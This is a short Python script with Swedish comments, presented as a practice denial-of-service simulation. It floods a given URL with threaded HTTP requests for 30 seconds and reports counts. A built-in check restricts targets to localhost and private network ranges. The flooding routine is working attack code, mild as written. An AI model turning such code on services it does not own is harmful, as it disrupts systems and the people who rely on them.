#!/usr/bin/env python3
"""
ENKEL DOS-SIMULERING - ENDAST FÖR ÖVNING
Attackera bara din egen dator!
"""
import requests
import threading
import time
import sys

def skicka_forfragan(webbadress, nummer):
    """Skickar en webblänkförfrågan"""
    try:
        svar = requests.get(webbadress, timeout=3)
        return svar.status_code
    except:
        return "MISSLYCKADES"

def arbetare(webbadress, sekunder_kvar, trad_id, resultat_lista):
    """Varje tråd gör många förfrågningar"""
    slut_tid = time.time() + sekunder_kvar
    antal_forfragningar = 0
    antal_lyckade = 0
    
    while time.time() < slut_tid:
        status = skicka_forfragan(webbadress, f"{trad_id}-{antal_forfragningar}")
        if status == 200:
            antal_lyckade += 1
        antal_forfragningar += 1
        time.sleep(0.1)  # Vänta 0.1 sekund mellan förfrågningar
    
    resultat_lista[trad_id] = (antal_forfragningar, antal_lyckade)
    print(f"Tråd {trad_id}: Skickade {antal_forfragningar} förfrågningar")

def starta_attack(webbadress, antal_tradar=20, varaktighet=30):
    """
    Startar attacken mot webbservern
    
    webbadress: Vilken hemsida vi attackerar (t.ex. http://localhost)
    antal_tradar: Hur många "robotar" som attackerar samtidigt
    varaktighet: Hur länge attacken pågår (sekunder)
    """
    print("\n" + "="*50)
    print("DOS-ATTACK STARTAR!")
    print(f"Mål: {webbadress}")
    print(f"Antal anfallare: {antal_tradar}")
    print(f"Tid: {varaktighet} sekunder")
    print("="*50 + "\n")
    
    start_tid = time.time()
    tradar = []
    resultat = {}
    
    # Starta alla "anfallare" (trådar)
    for i in range(antal_tradar):
        t = threading.Thread(target=arbetare, args=(webbadress, varaktighet, i, resultat))
        tradar.append(t)
        t.start()
        print(f"Anfallare {i+1}/{antal_tradar} startad")
    
    # Räkna ner tiden
    for sekund in range(varaktighet):
        time.sleep(1)
        if sekund % 5 == 0:
            print(f"Tid kvar: {varaktighet - sekund} sekunder...")
    
    # Vänta på att alla trådar är klara
    for t in tradar:
        t.join()
    
    # Sammanfatta resultat
    totalt_skickade = sum([r[0] for r in resultat.values()])
    totalt_lyckade = sum([r[1] for r in resultat.values()])
    
    print("\n" + "="*50)
    print("ATTACK AVSLUTAD!")
    print(f"Total tid: {time.time() - start_tid:.1f} sekunder")
    print(f"Totalt skickade förfrågningar: {totalt_skickade}")
    print(f"Lyckade förfrågningar: {totalt_lyckade}")
    print(f"Förfrågningar per sekund: {totalt_skickade/varaktighet:.1f}")
    print("="*50)

if __name__ == "__main__":
    # Kontrollera att vi har rätt adress
    if len(sys.argv) < 2:
        print("Användning: python3 attack.py <webbadress>")
        print("Exempel: python3 attack.py http://localhost")
        sys.exit(1)
    
    webbadress = sys.argv[1]
    
    # SÄKERHET: Bara attackera lokala adresser
    tillatna = ['http://localhost', 'http://127.', 'http://192.168.', 'http://10.']
    if not any(webbadress.startswith(pref) for pref in tillatna):
        print("FEL! Du får bara attackera din egen dator!")
        print("Använd en adress som börjar med: http://localhost eller http://192.168.")
        sys.exit(1)
    
    starta_attack(webbadress, antal_tradar=20, varaktighet=30)